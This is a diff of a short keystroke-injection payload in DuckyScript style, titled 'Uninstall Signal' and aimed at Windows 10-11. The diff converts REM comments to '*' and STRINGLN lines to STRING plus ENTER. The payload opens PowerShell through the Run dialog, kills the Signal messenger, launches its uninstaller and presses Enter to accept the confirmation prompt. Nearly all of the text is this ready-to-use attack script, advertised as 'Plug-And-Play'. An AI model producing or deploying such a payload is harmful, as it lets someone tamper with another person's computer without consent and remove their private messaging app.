@@ -1,18 +1,18 @@
-REM #####################################
-REM #                                   |
-REM # Title        : Uninstall Signal   |
-REM # Author       : Aleff              |
-REM # Version      : 1.0                |
-REM # Category     : Execution          |
-REM # Target       : Windows 10-11      |
-REM #                                   |
-REM #####################################
+* #####################################
+* #                                   |
+* # Title        : Uninstall Signal   |
+* # Author       : Aleff              |
+* # Version      : 1.0                |
+* # Category     : Execution          |
+* # Target       : Windows 10-11      |
+* #                                   |
+* #####################################
 
-REM Plug-And-Play <3
+* Plug-And-Play <3
 
-REM Requirements:
-REM   - Signal App installed
-REM   - ExecutionPolicy Bypass
+* Requirements:
+*   - Signal App installed
+*   - ExecutionPolicy Bypass
 
 DELAY 2000
 GUI r
@@ -21,10 +21,12 @@ STRING powershell
 ENTER
 DELAY 2000
 
-STRINGLN Stop-Process -Name "Signal"
+STRING Stop-Process -Name "Signal"
+ENTER
 DELAY 500
-STRINGLN  Start-Process "$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe"
+STRING  Start-Process "$env:LocalAppData\Programs\signal-desktop\Uninstall Signal.exe"
+ENTER
 DELAY 1000
-REM Popup "Are you sure?"
+* Popup "Are you sure?"
 ENTER
 ALT F4
